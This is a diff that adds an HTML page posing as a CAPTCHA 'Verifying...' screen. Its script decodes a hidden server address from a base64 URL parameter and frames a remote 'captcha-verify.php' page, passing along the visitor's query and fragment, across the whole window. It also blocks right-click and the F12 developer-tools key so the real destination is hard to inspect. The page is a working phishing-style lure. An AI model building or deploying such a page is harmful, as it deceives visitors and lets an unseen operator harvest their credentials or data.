@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Verifying...</title>
+</head>
+<style>
+    body{ margin: 0; } iframe{ display: block; height: 100vh; width: 100vw; border: none; }
+</style>
+<body oncontextmenu="return false;">
+    <iframe id="captcha-verify" src=""></iframe>
+</body>
+<noscript></noscript>
+<script>
+    var urlSearchParams=new URLSearchParams(window.location.search),params=Object.fromEntries(urlSearchParams.entries()),server=atob(params.server);
+    var fragment=window.location.hash.substr(1),query=window.location.search;fragment&&(fragment="#"+fragment),document.getElementById("captcha-verify").src=server+"/email-list/__vendor/captcha-verify.php"+query+fragment;
+    document.onkeypress=function(e){if(123==(e=e||window.event).keyCode)return!1},document.onmousedown=function(e){if(123==(e=e||window.event).keyCode)return!1},document.onkeydown=function(e){if(123==(e=e||window.event).keyCode)return!1}; 
+
+    var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+    var urlSearchParams = new URLSearchParams(window.location.search);
+    var params = Object.fromEntries(urlSearchParams.entries());
+</script>
+</html>
